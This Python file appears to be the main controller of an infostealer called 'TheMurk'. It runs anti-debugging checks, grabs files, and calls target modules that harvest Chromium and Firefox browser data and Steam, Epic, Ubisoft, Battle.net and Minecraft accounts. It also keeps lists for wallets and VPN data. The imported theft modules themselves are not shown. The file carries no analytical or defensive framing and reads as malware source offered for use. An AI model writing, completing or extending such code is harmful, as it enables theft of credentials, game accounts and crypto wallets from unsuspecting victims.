from preferences.config import *
from manager.antiDebug import AntiDebug
from manager.folders import Folders
from targets.files.files import TxtFiles
from targets.files.file_grabber import Grab
from targets.browsers.chromium import Chromium
from targets.browsers.geckodriver import GeckoDriver
from targets.games.steam import Steam
from targets.games.epicgames import Epic
from targets.games.uplay import Ubisoft
from targets.games.battlenet import BattleNet
from targets.games.minecraft import Minecraft

class TheMurk:
    def __init__(self) -> None:
        self.MainVars()
        self.Progress()
        self.Browsers()
    
    def MainVars(self):
        self.name = ''
        self.password = ''
        self.np = []
        self.msgSys = ""
        self.msgBrowsers =[]
        self.msgOther =[]
        self.msgWallets =[]
        self.msgFiles = []
        self.msgVPN = []
    
    def Progress(self):
        self.Start()
        self.GrabFiles()

    def Start(self):
        if not config.debuging:
            AntiDebug(config.oneStart)
        Folders(config.enableFileGrabber)
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgFiles = Grab(self.msgFiles)
        else:
            TxtFiles()
    
    def Browsers(self):
        config.msgBrowsers = Chromium()
        config.msgBrowsers = GeckoDriver(config.msgBrowsers)


    def Games(self):
        config.msgOther = Steam(config.msgOther)
        config.msgOther = Epic(config.msgOther)
        config.msgOther = Ubisoft(config.msgOther)
        config.msgOther = Minecraft(config.msgOther)
        config.msgOther = BattleNet(config.msgOther)